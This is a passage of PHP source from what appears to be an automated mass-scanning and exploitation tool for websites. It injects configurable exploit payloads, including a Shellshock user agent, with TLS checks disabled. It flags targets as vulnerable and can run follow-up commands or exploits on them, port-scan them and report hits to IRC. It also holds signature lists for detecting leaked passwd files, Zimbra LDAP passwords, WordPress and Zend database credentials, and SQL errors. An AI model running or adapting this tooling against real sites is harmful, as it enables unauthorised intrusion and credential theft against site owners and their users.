  (PHP 5) http://php.net/manual/en/function.curl-multi-init.php
 */

function __request_info($url_, $proxy = NULL, $postDados = NULL) {

    $url_ = __crypt($url_);
    $mh = curl_multi_init();
    $curl_array = array();
    $nodes = is_array($url_) ? $url_ : array($url_);

    foreach ($nodes as $i => $url) {

        $curl_array[$i] = curl_init($url);

        __plus();

        //FORMATANDO POST & EXECUTANDO urlencode EM CADA VALOR DO POST.
        if (not_isnull_empty($postDados) && is_array($postDados)) {

            foreach ($postDados as $campo => $valor) {

                $postDados_format .= "{$campo}=" . urlencode($valor) . '&';
            }

            $postDados_format = rtrim($postDados_format, '&');
            curl_setopt($curl_array[$i], CURLOPT_POST, count($postDados));
            curl_setopt($curl_array[$i], CURLOPT_POSTFIELDS, __crypt($postDados_format));
        }

        curl_setopt($curl_array[$i], CURLOPT_HTTPHEADER, array_merge(not_isnull_empty($_SESSION['config']['http-header']) ?
                                explode(',', __crypt($_SESSION['config']['http-header'])) : array(), array("Cookie: disclaimer_accepted=true")));
        curl_setopt($curl_array[$i], CURLOPT_USERAGENT, (not_isnull_empty($_SESSION['config']['user-agent'])) ?
                        __crypt($_SESSION['config']['user-agent']) : __setUserAgentRandom());
        curl_setopt($curl_array[$i], CURLOPT_REFERER, (not_isnull_empty($_SESSION['config']['url-reference'])) ?
                        __crypt($_SESSION['config']['url-reference']) : __setURLReferenceRandom());

        (!is_null($proxy) ? curl_setopt($curl_array[$i], CURLOPT_PROXY, $proxy) : NULL);
        (!is_null($_SESSION['config']['verifica_info'])) ? curl_setopt($curl_array[$i], CURLOPT_HEADER, 1) : NULL;
        (!is_null($_SESSION['config']['verifica_info']) && __validateOptions('3,6', $_SESSION['config']['debug']) ?
                        curl_setopt($curl_array[$i], CURLOPT_VERBOSE, 1) : NULL);

        __plus();
        curl_setopt($curl_array[$i], CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($curl_array[$i], CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($curl_array[$i], CURLOPT_FRESH_CONNECT, 1);
        curl_setopt($curl_array[$i], CURLOPT_RETURNTRANSFER, 1);

        curl_setopt($curl_array[$i], CURLOPT_CONNECTTIMEOUT, not_isnull_empty($_SESSION['config']['time-out']) ?
                        $_SESSION['config']['time-out'] : 5);

        curl_setopt($curl_array[$i], CURLOPT_TIMEOUT, not_isnull_empty($_SESSION['config']['time-out']) ?
                        $_SESSION['config']['time-out'] : 5);

        curl_setopt($curl_array[$i], CURLOPT_COOKIEFILE, not_isnull_empty($_SESSION['config']['file-cookie']) ?
                        $_SESSION['config']['file-cookie'] : 'cookie.txt');

        curl_setopt($curl_array[$i], CURLOPT_COOKIEJAR, not_isnull_empty($_SESSION['config']['file-cookie']) ?
                        $_SESSION['config']['file-cookie'] : 'cookie.txt');

        curl_multi_add_handle($mh, $curl_array[$i]);
    }
    $running = NULL;
    do {

        usleep(100);
        curl_multi_exec($mh, $running);
    } while ($running > 0);
    $ret = array();
    foreach ($nodes as $i => $url) {

        $ret[0] = curl_multi_getcontent($curl_array[$i]);
        $ret[1] = curl_getinfo($curl_array[$i]);
        $ret[2] = curl_error($curl_array[$i]);
    }
    foreach ($nodes as $i => $url) {
        curl_multi_remove_handle($mh, $curl_array[$i]);
    }

    $status = NULL;
    preg_match_all('(HTTP.*)', $ret[0], $status['http']);
    preg_match_all('(Server:.*)', $ret[0], $status['server']);
    preg_match_all('(X-Powered-By:.*)', $ret[0], $status['X-Powered-By']);

    __plus();
    $ret[3] = str_replace("\r", '', str_replace("\n", '', "{$status['http'][0][0]}, {$status['server'][0][0]}  {$status['X-Powered-By'][0][0]}"));
    __debug(array('debug' => "[ BODY ]{$ret[0]}", 'function' => '__request_info'), 4);

    __plus();
    __debug(array('debug' => "[ URL ]{$url_}", 'function' => '__request_info'), 2);

    __plus();
    curl_multi_close($mh) . unlink('cookie.txt');

    __plus();
    unset($curl_array);
    return isset($ret[0]) ? array('corpo' => $ret[0], 'server' => $ret[1], 'error' => $ret[2], 'info' => $ret[3]) : FALSE;
}

################################################################################
#CAPTURE INFORMATION SERVER AND VALIDATE FAULTS#################################
################################################################################

function __infoServer($url_, $postDados = NULL) {

    __plus();
    $_SESSION['config']['verifica_info'] = 1;
    $resultado = __request_info($url_, $_SESSION["config"]["proxy"], $postDados);
    __plus();
    if (isset($resultado['corpo'])) {
        if (!is_null($_SESSION['config']['extrai-email'])) {

            __plus();
            return __extractEmail($resultado['corpo'], $url_);
        }

        if (!is_null($_SESSION['config']['extrai-url'])) {

            __plus();
            return __extractURLs($resultado['corpo'], $url_);
        }

        if (not_isnull_empty($_SESSION['config']['regexp-filter'])) {

            __plus();
            return __extractRegCustom($resultado['corpo'], $url_);
        }

        if (not_isnull_empty($_SESSION['config']['target']) && $_SESSION['config']['tipoerro'] == 5) {

            __plus();
            return __checkURLs($resultado, $url_);
        }

        $ifcode = not_isnull_empty($_SESSION['config']['ifcode']) &&
                strstr($resultado['server']['http_code'], $_SESSION['config']['ifcode']) ?
                "CODE_HTTP_FOUND: {$_SESSION['config']['ifcode']} / " : NULL;


        $ifredirect = not_isnull_empty($_SESSION['config']['ifredirect']) &&
                (strstr($resultado['server']['redirect_url'], $_SESSION['config']['ifredirect'])) ?
                'VALUE URL REDIRECT FOUND' : NULL;

        $_SESSION['config']['erroReturn'] = $ifredirect . $ifcode . __checkError($resultado['corpo']);
        __plus();
        $_SESSION['config']['curl_getinfo'] = $resultado['server'];
        $_SESSION['config']['error_conection'] = (not_isnull_empty($resultado['error']) ? $resultado['error'] : NULL);
        $_SESSION['config']['server_ip'] = (!is_null($resultado['server']['primary_ip']) ? $resultado['server']['primary_ip'] : NULL);
        $_SESSION['config']['vull_style'] = (not_isnull_empty($_SESSION['config']['erroReturn'])) ?
                "{$_SESSION["c4"]}( POTENTIALLY VULNERABLE ){$_SESSION["c0"]}  \033[1m \033[32m" . __cli_beep() : NULL;
        $_SESSION['config']['resultado_valores'].=(not_isnull_empty($_SESSION['config']['erroReturn'])) ? "{$url_}\n" : NULL;
        __plus();
        $url_ = ($_SESSION['config']['alexa-rank']) ? ", RANK ALEXA: " . __positionAlexa($url_) : NULL;
        __plus();
        $_SESSION['config']['info_ip'] = __infoIP($resultado['server']['primary_ip'], 1);
        __plus();
    } else {
        return FALSE;
    }
    __plus();

    return "{$resultado['info']}, IP:{$resultado['server']['primary_ip']}:{$resultado['server']['primary_port']} {$url_}";
}

################################################################################
#ERROR MAIN PROCESS RESPONSIBLE FOR ALL VALIDATION OF MOTOR#####################
################################################################################

function __processUrlExec($url, $contUrl) {

    __plus();
    if (is_null($url) || empty($url)) {

        return FALSE;
    }

    $host = (!is_null($_SESSION['config']['replace'])) ?
            __replace($_SESSION['config']['replace'], urldecode($_SESSION['config']['tipoerro'] == 3 ? __filterHostname($url) : ($url))) :
            urldecode($_SESSION['config']['tipoerro'] == 3 ? __filterHostname($url) : ($url));

    $target_['url_xpl'] = __remove($_SESSION['config']['remove'], __mountURLExploit(!is_null($_SESSION['config']['url']) ? $_SESSION['config']['url'] . $host : $host));
    $info = __infoServer($target_['url_xpl'], $_SESSION['config']['exploit-post']);
    $target_['url_clean'] = ($_SESSION['config']['tipoerro'] == 4) ? $_SESSION['config']['url'] . $host : urldecode($url);

    __plus();

    if ($_SESSION['config']['tipoerro'] != 5 && is_null($_SESSION['config']['extrai-email']) &&
            is_null($_SESSION['config']['extrai-url']) && is_null($_SESSION['config']['regexp-filter'])) {

        $ifredirect = strstr($_SESSION['config']['curl_getinfo']['redirect_url'], $_SESSION['config']['ifredirect']) ?
                "{$_SESSION["c4"]}{$_SESSION['config']['curl_getinfo']['redirect_url']}" : NULL;
        $exget = (not_isnull_empty($_SESSION['config']['exploit-get']) ? ' _/GET=> ' . $_SESSION['config']['exploit-get'] : NULL);
        $expost = (not_isnull_empty($_SESSION['config']['exploit-post']) ? ' _/POST=> ' . $_SESSION['config']['exploit-post_str'] : NULL);
        $valid_return = (not_isnull_empty($_SESSION['config']['erroReturn'])) ? TRUE : FALSE;
        $info = ($valid_return) ? "{$_SESSION["c4"]}{$info}" : $info;
        $target_ip = ($valid_return) ? "{$_SESSION["c4"]}{$_SESSION['config']['info_ip']}" : $_SESSION['config']['info_ip'];

        $anime = ($valid_return) ? '[ ! ]' : '[ - ]';
        echo __plus() . "\n";

        echo "{$_SESSION["c1"]}{$_SESSION['config']['line']}{$_SESSION["c0"]}\n";
        echo "{$_SESSION["c1"]}|_[ + ] [{$_SESSION["c1"]} {$contUrl} / {$_SESSION['config']['total_url']} {$_SESSION["c1"]}]{$_SESSION["c9"]}-[" . date("H:i:s") . "]{$_SESSION["c1"]} {$anime} {$_SESSION["c0"]}\n";
        echo "{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Target:: {$_SESSION["c1"]}[{$_SESSION["c9"]} {$_SESSION['config']['vull_style']}{$target_['url_clean']}{$_SESSION["c1"]} ]{$_SESSION["c0"]}\n";
        echo "{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Exploit:: {$_SESSION["c0"]}{$_SESSION["c3"]}{$exget}{$expost}{$_SESSION["c0"]}\n";
        echo (not_isnull_empty($_SESSION['config']['replace'])) ? ("{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Replace:: {$_SESSION["c0"]}{$_SESSION["c3"]}{$_SESSION['config']['replace']}{$_SESSION["c0"]}\n") : NULL;
        echo (not_isnull_empty($_SESSION['config']['remove'])) ? ("{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Remove:: {$_SESSION["c0"]}{$_SESSION["c3"]}{$_SESSION['config']['remove']}{$_SESSION["c0"]}\n") : NULL;
        echo (isset($_SESSION['config']['cms-check-resultado'])) ? ("{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}CMS check:: {$_SESSION["c0"]}{$_SESSION["c3"]}{$_SESSION['config']['cms-check-resultado']}{$_SESSION["c0"]}\n") : NULL;
        echo "{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Information Server:: {$_SESSION["c0"]}{$_SESSION["c9"]}{$info}{$_SESSION["c1"]}\n";
        echo "{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}More details:: {$_SESSION["c0"]}{$_SESSION["c9"]}{$target_ip}{$_SESSION["c1"]}\n";
        echo "{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Found:: {$_SESSION["c9"]}" . ($valid_return ? "{$_SESSION["c4"]}{$_SESSION['config']['erroReturn']}" : "UNIDENTIFIED") . "{$_SESSION["c0"]}";
        echo (not_isnull_empty($ifredirect) ? "\n{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}URL REDIRECT:: {$_SESSION["c9"]}{$ifredirect}{$_SESSION["c0"]}" : NULL);
        echo (not_isnull_empty($_SESSION['config']['error_conection']) ? "\n{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}ERROR CONECTION:: {$_SESSION["c2"]}{$_SESSION['config']['error_conection']}{$_SESSION["c0"]}" : NULL);
        ($valid_return ? __saveValue($_SESSION['config']['arquivo_output'], $target_['url_xpl'], 1) : NULL);
        echo ($_SESSION['config']['sendmail'] ? "\n{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}SEND MAIL:: {$_SESSION["c9"]}" . (($valid_return) ? "{$_SESSION["c4"]}" : NULL) . __sendMail($_SESSION['config']['sendmail'], $target_['url_xpl']) . "{$_SESSION["c0"]}" : NULL);
        (not_isnull_empty($_SESSION['config']['arquivo_output_all']) ? __saveValue($_SESSION['config']['arquivo_output_all'], $target_['url_xpl'], NULL) : NULL);
        __plus();

        if ($valid_return) {

            (not_isnull_empty($_SESSION['config']['irc']['irc_connection']) ?
                            __ircMsg($_SESSION['config']['irc'], "{$_SESSION['config']['erroReturn']}::: {$target_['url_xpl']}") : NULL);
            __plus();

            (not_isnull_empty($_SESSION['config']['command-vul']) ? __command($_SESSION['config']['command-vul'], $target_) : NULL);
            __plus();

            (not_isnull_empty($_SESSION['config']['exploit-vul-id']) ?
                            __configExploitsExec($_SESSION['config']['exploit-vul-id'], $target_) : NULL);
            __plus();
        }

        (not_isnull_empty($_SESSION['config']['command-all']) ? __command($_SESSION['config']['command-all'], $target_) : NULL);
        __plus();

        (not_isnull_empty($_SESSION['config']['sub-file']) &&
                is_array($_SESSION['config']['sub-file']) ? __subExecExploits($target_['url_xpl'], $_SESSION['config']['sub-file']) : NULL);
        __plus();

        (not_isnull_empty($_SESSION['config']['exploit-all-id']) ? __configExploitsExec($_SESSION['config']['exploit-all-id'], $target_) : NULL);
        __plus();

        ($_SESSION['config']['robots'] ? __getValuesRobots($host) : NULL);
        __plus();

        (not_isnull_empty($_SESSION['config']['port-scan']) ? __portScan(array(0 => $target_, 1 => $_SESSION['config']['port-scan'])) : NULL);
        __plus();

        __timeSec('delay', "\n");
    }
}

################################################################################
#PRINT MESSAGE AND OUT OF THE PROCESS###########################################
################################################################################

function __getOut($msg) {
    __ircQuit($_SESSION['config']['irc']);
    print_r($msg);
    exit(1);
}

################################################################################
#ERROR MAIN PROCESS RESPONSIBLE FOR ALL VALIDATION OF ENGINE####################
################################################################################

function __process($resultadoURL) {

    __plus();
    $resultadoURL[0] = (is_array($resultadoURL) ? array_unique(array_filter($resultadoURL)) : $resultadoURL);
    $resultadoURL[0] = ($_SESSION['config']['unique'] ? __filterDomainUnique($resultadoURL[0]) : $resultadoURL[0]);

    $resultadoURL[0] = (not_isnull_empty($_SESSION['config']['ifurl']) ? __filterURLif($resultadoURL[0]) : $resultadoURL[0]);
    $_SESSION['config']['total_url'] = count($resultadoURL[0]);

    echo "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c12"]}[ TOTAL FOUND VALUES ]::{$_SESSION["c1"]} [ {$_SESSION['config']['total_url']} ]{$_SESSION["c0"]}\n";
    __debug(array('debug' => $resultadoURL[0], 'function' => '__process'), 3);

    if (count($resultadoURL[0]) > 0) {

        $_SESSION['config']['irc']['irc_connection'] = (not_isnull_empty($_SESSION['config']['irc']['conf']) ? __ircConect($_SESSION['config']['irc']) : NULL);
        $_SESSION['config']['irc']['my_fork'] = pcntl_fork();

        if ($_SESSION['config']['irc']['my_fork'] == 0) {

            (not_isnull_empty($_SESSION['config']['irc']['irc_connection']) ? __ircPong($_SESSION['config']['irc']) : NULL);
            exit(0);
        } else if ($_SESSION['config']['irc']['my_fork'] == -1) {

            __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}ERROR Fork failed{$_SESSION["c0"]}\n");
        }

        $_SESSION['config']['user-agent'] = ($_SESSION['config']['shellshock']) ? $_SESSION['config']['user_agent_xpl'] : $_SESSION['config']['user-agent'];
        foreach ($resultadoURL[0] as $url) {

            __plus();
            $url = urldecode(not_isnull_empty($_SESSION['config']['target']) ?
                            $_SESSION['config']['target'] . $url : $url);

            if (__validateURL($url) || not_isnull_empty($_SESSION['config']['abrir-arquivo'])) {

                __processUrlExec(__filterURLTAG($url), $_SESSION["config"]["contUrl"] ++);
                __plus();
            }
        }
    } else {

        print_r("{$_SESSION["c1"]}[ INFO ]{$_SESSION["c2"]} Not a satisfactory result was found!{$_SESSION["c0"]}\n");
    }
}

################################################################################
#ERRORS STANDARDS OF SCRIPT VALIDATE WITH HTML RECEIVED#########################
################################################################################

function __checkError($html_) {


    if (__validateOptions($_SESSION['config']['tipoerro'], '2')) {

        $validation['ERROR-CUSTOM'] = not_isnull_empty($_SESSION['config']['achar']) ? $_SESSION['config']['achar'] : NULL;
    }

    if (__validateOptions('1,3,4', $_SESSION['config']['tipoerro'])) {

        if (__validateOptions('3,4', $_SESSION['config']['tipoerro'])) {

            $validation['ERROR-CUSTOM'] = not_isnull_empty($_SESSION['config']['achar']) ? $_SESSION['config']['achar'] : NULL;
        }

        /* [*]SHELLSHOCK
         * (CVE-2014-6271, CVE-2014-6277,
         * CVE-2014-6278, CVE-2014-7169, 
         * CVE-2014-7186, CVE-2014-7187) 
         * is a vulnerability in GNU's bash shell that gives attackers access 
         * to run remote commands on a vulnerable system. */
        $validation['SHELLSHOCK-01'] = '99887766555';

        /* [*]LOCAL FILE INCLUSION
         * Local File Inclusion (also known as LFI) is the process of including 
         * files, that are already locally present on the server, through the 
         * exploiting of vulnerable inclusion procedures implemented in the 
         * application. 
         * https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion */
        $validation['LOCAL-FILE-INCLUSION-01'] = '/root:/';
        $validation['LOCAL-FILE-INCLUSION-02'] = 'root:x:0:0:';
        $validation['LOCAL-FILE-INCLUSION-03'] = 'mysql:x:';

        /* [*]ZIMBRA MAIL
         * Zimbra 0day exploit / Privilegie escalation via LFI
         * This script exploits a Local File Inclusion in
         * /res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz
         * which allows us to see localconfig.xml
         * that contains LDAP root credentials wich allow us to make requests in
         * /service/admin/soap API with the stolen LDAP credentials to create user
         * with administration privlegies
         * and gain acces to the Administration Console.
         * https://www.exploit-db.com/exploits/30085/ */
        $validation['ZIMBRA-WEB-MAIL-01'] = 'zimbra_user';
        $validation['ZIMBRA-WEB-MAIL-02'] = 'zimbra_ldap_password';
        $validation['ZIMBRA-WEB-MAIL-03'] = 'ldap_replication_password';
        $validation['ZIMBRA-WEB-MAIL-04'] = 'ldap_root_password';
        $validation['ZIMBRA-WEB-MAIL-05'] = 'ldap_nginx_password';
        $validation['ZIMBRA-WEB-MAIL-06'] = 'mailboxd_keystore_password';
        $validation['ZIMBRA-WEB-MAIL-07'] = 'zimbra_mysql_password';
        $validation['ZIMBRA-WEB-MAIL-08'] = 'mysql_root_password';
        $validation['ZIMBRA-WEB-MAIL-10'] = 'mailboxd_truststore_password';
        $validation['ZIMBRA-WEB-MAIL-11'] = 'ldap_postfix_password';
        $validation['ZIMBRA-WEB-MAIL-12'] = 'ldap_amavis_password';

        /* [*]ZEND FRAMEWORK
         * Zend-Framework Full Info Disclosure
         * The username and password of the database may be obtained trough 
         * the "application.ini" file
         * https://www.exploit-db.com/exploits/29921/ */
        $validation['ZEND-FRAMEWORK-01'] = 'mail.transport.username';
        $validation['ZEND-FRAMEWORK-02'] = 'mail.transport.password';
        $validation['ZEND-FRAMEWORK-03'] = 'db.params.username';
        $validation['ZEND-FRAMEWORK-04'] = 'db.params.password';
        $validation['ZEND-FRAMEWORK-05'] = 'db.params.dbname';

        /* [*]CMS WORDPRESS
         * As the name suggests, if the web application doesn’t check the file 
         * name required by the user, any malicious user can exploit this 
         * vulnerability to download sensitive files from the server.
         * Arbitrary File Download vulnerability file wp-config.php
         * http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
         * http://www.acunetix.com/vulnerabilities/web/wordpress-plugin-slider-revolution-arbitrary-file-disclosure */
        $validation['CMS-WORDPRESS-01'] = "define('DB_NAME'";
        $validation['CMS-WORDPRESS-02'] = "define('DB_USER'";
        $validation['CMS-WORDPRESS-03'] = "define('DB_PASSWORD'";
        $validation['CMS-WORDPRESS-04'] = "define('DB_HOST'";

        /* [*]ERROR MARIADB
         * MariaDB is a drop-in replacement for MySQL.
         * MariaDB strives to be the logical choice for database professionals 
         * looking for a robust, scalable, and reliable SQL server. To accomplish 
         * this, the MariaDB Foundation work closely and cooperatively with the 
         * larger community of users and developers in the true spirit of Free 
         * and open source software, and release software in a manner that 
         * balances predictability with reliability.
         * https://mariadb.org/en/about/ */
        $validation['MARIADB-01'] = 'MariaDB server version for the right syntax';

        /* [*]ERROR MYSQL
         * MySQL is a database management system (DBMS), which uses the SQL 
         * (Structured Query Language, English Structured Query Language) as 
         * interface. It is currently one of the most popular databases, with 
         * more than 10 million installations worldwide
         * https://www.mysql.com/ 
         * http://php.net/manual/en/security.database.sql-injection.php
         */
        $validation['MYSQL-AND-MARIADB'] = 'You have an error in your SQL syntax;';
        $validation['MYSQL-03'] = 'Warning: mysql_';
        $validation['MYSQL-04'] = 'function.mysql';
        $validation['MYSQL-05'] = 'MySQL result index';
        $validation['MYSQL-07'] = 'MySQL Error';
        $validation['MYSQL-08'] = 'MySQL ODBC';
        $validation['MYSQL-09'] = 'MySQL Driver';
        $validation['MYSQL-10'] = 'mysqli.query';
        $validation['MYSQL-11'] = 'num_rows';
        $validation['MYSQL-12'] = 'mysql error:';
        $validation['MYSQL-13'] = 'supplied argument is not a valid MySQL result resource';
        $validation['MYSQL-14'] = 'on MySQL result index';
        $validation['MYSQL-15'] = 'Error Executing Database Query';
        $validation['MYSQL-01'] = 'mysql_';

        /* [*]ERROR MICROSOFT
         * MICROSOFT TECHNOLOGY
         * http://www.microsoft.com/pt-br/server-cloud/products/sql-server/
         * https://products.office.com/pt-br/access 
         * https://www.owasp.org/index.php/Testing_for_SQL_Server */
        $validation['MICROSOFT-01'] = 'Microsoft JET Database';
        $validation['MICROSOFT-02'] = 'ADODB.Recordset';
        $validation['MICROSOFT-03'] = '500 - Internal server error';
        $validation['MICROSOFT-04'] = 'Microsoft OLE DB Provider';
        $validation['MICROSOFT-05'] = 'Unclosed quotes';
        $validation['MICROSOFT-06'] = 'ADODB.Command';
        $validation['MICROSOFT-07'] = 'ADODB.Field error';
        $validation['MICROSOFT-08'] = 'Microsoft VBScript';
        $validation['MICROSOFT-09'] = 'Microsoft OLE DB Provider for SQL Server';
        $validation['MICROSOFT-10'] = 'Unclosed quotation mark';
        $validation['MICROSOFT-11'] = 'Microsoft OLE DB Provider for Oracle';
        $validation['MICROSOFT-14'] = 'Active Server Pages error';
        $validation['MICROSOFT-15'] = 'OLE/DB provider returned message';
        $validation['MICROSOFT-16'] = 'OLE DB Provider for ODBC';
        $validation['MICROSOFT-17'] = "error '800a0d5d'";
        $validation['MICROSOFT-18'] = "error '800a000d'";
        $validation['MICROSOFT-19'] = 'Unclosed quotation mark after the character string';
        $validation['MICROSOFT-20'] = '[Microsoft][SQL Server Native Client 11.0][SQL Server]';
        $validation['MICROSOFT-21'] = 'Warning: odbc_';

        /* #[*]ERROR ORACLE
         * - DBMS currently marketed by Oracle, who was born in 1979 and was 
         * the first relational BD sold worldwide;
         * - Latest version: Oracle Database 11G;
         * http://www.oracle.com/br/solutions/midsize/oracle-products/database/index.html
         * https://www.blackhat.com/presentations/bh-usa-05/bh-us-05-fayo.pdf */
        $validation['ORACLE-01'] = 'ORA-00921: unexpected end of SQL command';
        $validation['ORACLE-02'] = 'ORA-01756';
        $validation['ORACLE-03'] = 'ORA-';
        $validation['ORACLE-04'] = 'Oracle ODBC';
        $validation['ORACLE-05'] = 'Oracle Error';
        $validation['ORACLE-06'] = 'Oracle Driver';
        $validation['ORACLE-07'] = 'Oracle DB2';
        $validation['ORACLE-08'] = 'error ORA-';
        $validation['ORACLE-09'] = 'SQL command not properly ended';

        /* #[*]ERROR DB2
         * DB2 is a database system Relational Manager (SGDBR) produced by IBM. 
         * There are different versions of DB2 running from a simple PDA | 
         * handheld, even in powerful mainframes and run on servers based on 
         * Unix, Windows, or Linux.
         * http://www-01.ibm.com/software/br/db2/lowerdatabasecosts/
         * https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet#DB2_Escaping */
        $validation['DB2-01'] = 'DB2 ODBC';
        $validation['DB2-02'] = 'DB2 error';
        $validation['DB2-03'] = 'DB2 Driver';

        /* #[*]ERROR ODBC
         * ODBC (acronym for Open Database Connectivity) is a standard for 
         * access to managers of database systems (DBMS).
         * https://support.office.com/pt-br/article/Administrar-fontes-de-dados-ODBC-b19f856b-5b9b-48c9-8b93-07484bfab5a7
         * https://www.exploit-db.com/papers/12975/ */
        $validation['ODBC-01'] = 'ODBC SQL';
        $validation['ODBC-02'] = 'ODBC DB2';
        $validation['ODBC-03'] = 'ODBC Driver';
        $validation['ODBC-04'] = 'ODBC Error';
        $validation['ODBC-05'] = 'ODBC Microsoft Access';
        $validation['ODBC-06'] = 'ODBC Oracle';
        $validation['ODBC-07'] = 'ODBC Microsoft Access Driver';

        /* #[*]ERROR POSTGRESQL
         * PostgreSQL is an object-relational database management system 
         * (ORDBMS), developed as an open source project.
         * http://www.postgresql.org.br/old/
         * https://www.owasp.org/index.php/OWASP_Backend_Security_Project_Testing_PostgreSQL */
        $validation['POSTGRESQL-01'] = 'Warning: pg_';
        $validation['POSTGRESQL-02'] = 'PostgreSql Error:';
        $validation['POSTGRESQL-03'] = 'function.pg';
        $validation['POSTGRESQL-04'] = 'Supplied argument is not a valid PostgreSQL result';
        $validation['POSTGRESQL-05'] = 'PostgreSQL query failed: ERROR: parser: parse error';
        $validation['POSTGRESQL-06'] = 'pg_';

        /* #[*]ERROR SYBASE
         * Sybase (NYSE: SY), an SAP company, is a software company that 
         * produces services and products related to information management, 
         * mobility, messaging, development tools, and data warehousing and 
         * OLAP data.
         * https://www.owasp.org/index.php?search=SYBASE&title=Special%3ASearch&go=Go */
        $validation['SYBASE-01'] = 'Warning: sybase_';
        $validation['SYBASE-02'] = 'function.sybase';
        $validation['SYBASE-03'] = 'Sybase result index';
        $validation['SYBASE-04'] = 'Sybase Error:';
        $validation['SYBASE-05'] = 'Sybase: Server message:';
        $validation['SYBASE-06'] = 'sybase_';
        $validation['SYBASE-07'] = '[Sybase][ODBC Driver]:';

        /* #[*]ERROR JBOSSWEB 
         * JBoss Web Server is an enterprise ready web server designed for 
         * medium and large applications, based on Tomcat. 
         * JBoss Web a component of the JBoss Application Server, there are 
         * no more standalone version of JBoss Web you need the Application 
         * Server to get the Servlet/JSP container.
         * http://jbossweb.jboss.org/
         * http://www.rapid7.com/db/search?utf8=%E2%9C%93&q=JBoss+&t=a */
        $validation['JBOSSWEB-01'] = 'java.sql.SQLSyntaxErrorException: ORA-';
        $validation['JBOSSWEB-02'] = 'org.springframework.jdbc.BadSqlGrammarException:';
        $validation['JBOSSWEB-03'] = 'javax.servlet.ServletException:';
        $validation['JBOSSWEB-04'] = 'java.lang.NullPointerException';

        /* #[*]ERROR JDBC
         * Java Database Connectivity or JDBC is a set of classes and 
         * interfaces (API) written in Java that make sending SQL statements 
         * for any relational database
         * http://www.oracle.com/technetwork/java/javase/jdbc/index.html
         * https://www.owasp.org/index.php/Preventing_SQL_Injection_in_Java */
        $validation['JDBC_CFM-01'] = 'Error Executing Database Query';
        $validation['JDBC_CFM-02'] = 'SQLServer JDBC Driver';
        $validation['JDBC_CFM-03'] = 'JDBC SQL';
        $validation['JDBC_CFM-04'] = 'JDBC Oracle';
        $validation['JDBC_CFM-05'] = 'JDBC MySQL';
        $validation['JDBC_CFM-06'] = 'JDBC error';
        $validation['JDBC_CFM-07'] = 'JDBC Driver';

        /* #[*]JAVA INFINITYDB
         * InfinityDB is an all-Java embedded database engine that is deployed 
         * in handheld devices, on servers, on workstations, and in distributed 
         * settings. */
        $validation['JAVA-INFINITYDB-01'] = 'java.io.IOException: InfinityDB';

        /* #[*]ERROR PHP 
         * The PHP development team announces the immediate availability of 
         * PHP 5.4.40. 14 security-related bugs were fixed in this release, 
         * including CVE-2014-9709, CVE-2015-2301, CVE-2015-2783, CVE-2015-1352. 
         * All PHP 5.4 users are encouraged to upgrade to this version.
         * http://php.net/ */
        $validation['ERRORPHP-01'] = 'Warning: include';
        $validation['ERRORPHP-02'] = 'Fatal error: include';
        $validation['ERRORPHP-03'] = 'Warning: require';
        $validation['ERRORPHP-04'] = 'Fatal error: require';
        $validation['ERRORPHP-05'] = 'ADODB_Exception';
        $validation['ERRORPHP-06'] = 'Warning: include(';
        $validation['ERRORPHP-07'] = 'Warning: require_once(';
        $validation['ERRORPHP-08'] = 'function.include';
        $validation['ERRORPHP-09'] = 'Disallowed Parent Path';
        $validation['ERRORPHP-10'] = 'function.require';
        $validation['ERRORPHP-11'] = 'Warning: main(';
        $validation['ERRORPHP-12'] = 'Warning: session_start()';
        $validation['ERRORPHP-13'] = 'Warning: getimagesize()';
        $validation['ERRORPHP-16'] = 'Warning: array_merge()';
        $validation['ERRORPHP-17'] = 'Warning: preg_match()';
        $validation['ERRORPHP-18'] = 'GetArray()';
        $validation['ERRORPHP-19'] = 'FetchRow()';
        $validation['ERRORPHP-20'] = 'Warning: preg_';
        $validation['ERRORPHP-21'] = 'Warning: ociexecute()';
        $validation['ERRORPHP-22'] = 'Warning: ocifetchstatement()';
        $validation['ERRORPHP-23'] = 'PHP Warning:';

        /* #[*]ERROR ASP
         * The ASP (Active Server Pages), also known as Classic ASP today, is a
         * framework of basic libraries (and not a language) for processing of
         * scripting languages on the server side to generate dynamic content on
         * the Web
         * http://www.asp.net/ */
        $validation['ERRORASP-01'] = 'Version Information: Microsoft .NET Framework';
        $validation['ERRORASP-04'] = 'ASP.NET is configured to show verbose error messages';
        $validation['ERRORASP-05'] = 'BOF or EOF';
        $validation['ERRORASP-06'] = 'Unclosed quotation mark';
        $validation['ERRORASP-06'] = 'Error converting data type varchar to numeric';

        /* #[*]ERROR LUA 
         * Lua is a scripting language imperative, procedural, small, reflective
         * and light, designed to expand applications in general, to be an 
         * extensible language (which connects parts of a program made in more 
         * than one language)
         * http://www.lua.org/ */
        $validation['ERRORLUA-01'] = 'LuaPlayer ERROR:';
        $validation['ERRORLUA-02'] = 'CGILua message';
        $validation['ERRORLUA-03'] = 'Lua error';

        #[*]ERROR INDEFINIDOS
        $validation['INDEFINITE-01'] = 'Incorrect syntax near';
        $validation['INDEFINITE-02'] = 'Fatal error';
        $validation['INDEFINITE-04'] = 'Invalid Querystring';
